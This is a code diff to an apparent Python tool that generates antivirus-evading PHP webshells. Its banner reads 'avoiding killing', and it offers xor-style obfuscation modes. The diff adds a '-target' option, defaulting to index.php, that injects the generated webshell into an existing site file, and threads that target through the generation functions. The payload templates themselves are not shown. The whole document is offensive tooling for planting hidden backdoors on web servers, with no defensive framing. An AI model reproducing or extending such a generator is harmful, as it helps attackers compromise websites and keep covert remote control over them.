@@ -12,12 +12,12 @@ def render():
     font = Figlet(font='smslant')
     print(Fore.BLUE + font.renderText("avoiding killing"))
 
-def init_generate(template,encrypt,nums,filename):
+def init_generate(template,encrypt,nums,filename,tname):
     if encrypt != 'xorN':
-        constructor = Constructor(template, encrypt)
+        constructor = Constructor(template, encrypt,tname)
         constructor.generate(filename)
     else:
-        constructor = ConstructorXorN(template, "xorN", nums)
+        constructor = ConstructorXorN(template, "xorN", nums,tname)
         constructor.generate(filename)
 
 def check_php(filename:str):
@@ -34,7 +34,7 @@ def init_template(type):
 
     return str(templates[type[0]])
 
-def generate_all():
+def generate_all(tname):
     check_dir()
     nums = 3
     filenames = []
@@ -45,18 +45,18 @@ def generate_all():
             filenames.append((t,e,3,"webshell/"+t2+'_'+e+'_'+str(nums)+'.php'))
 
     for t,e,n,f in tqdm(filenames):
-        init_generate(t,e,n,f)
+        init_generate(t,e,n,f,tname)
 
 
 def engine(args):
     render()
     if args.all:
         print("starting------>")
-        generate_all()
+        generate_all(args.tname)
     else:
         print("starting   (*  ^  *) ")
         for f in tqdm(args.name):
-            _ = init_generate(init_template(args.type),args.key,args.nums,f) if check_php(f)  else print("filename error")
+            _ = init_generate(init_template(args.type),args.key,args.nums,f,args.tname) if check_php(f)  else print("filename error")
 
 
 
@@ -84,10 +84,15 @@ parser.add_argument('-name',dest="name",type=str,nargs='+',default=['shell.php']
 filename:
 \n\tthe name of webshell you have defined.(you can provide multi filenames),
 """)
+parser.add_argument('-target',dest="tname",type=str,nargs='+',default=['index.php'],help="""
+filename:
+\n\tthe name of webshell you want to injected.(you can provide multi filenames),
+""")
 parser.add_argument('-n',dest='nums',type=int,nargs=1,default=2,help="""
 nums:
 \n\tif you choose xorN, this is the N,
 """)
+
 parser.add_argument('-all',dest='all',action='store_true',help="""
 all:
 \n\tgenerate all webshell,
